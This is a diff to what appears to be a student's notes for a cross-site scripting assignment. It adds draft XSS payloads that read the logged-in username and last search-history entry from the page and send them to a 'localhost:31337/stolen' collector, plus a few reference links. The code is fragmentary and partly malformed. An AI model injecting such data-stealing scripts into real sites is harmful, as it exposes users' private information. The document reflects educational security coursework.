@@ -103,6 +103,28 @@ Part 1: Cross-site Scripting (35%)
 
 		<script> alert("Hi"); </script>
 
+		<script>
+			window.onload = function(){ 
+
+			};
+
+
+		</script>
+
+			var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
+				var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;
+				var xmlHttp = new XMLHttpRequest();
+				xmlHttp.open( "GET", theUrl, true );
+				xmlHttp.send(null);
+
+		<script>
+			window.onload = function(){ 
+				{var username = document.getElementById(`logged-in-user`).innerHTML}
+				alert(`Hi`)
+			
+			};
+		</script>
+
 
 
 
@@ -222,10 +244,12 @@ Additional Questions
 
 
 		---- 2 ----
+		https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest
 
 
 		---- 3 ----
 		https://sechow.com/bricks/docs/login-1.html
+		https://www.w3schools.com/tags/att_form_method.asp
 
 		---4---
 
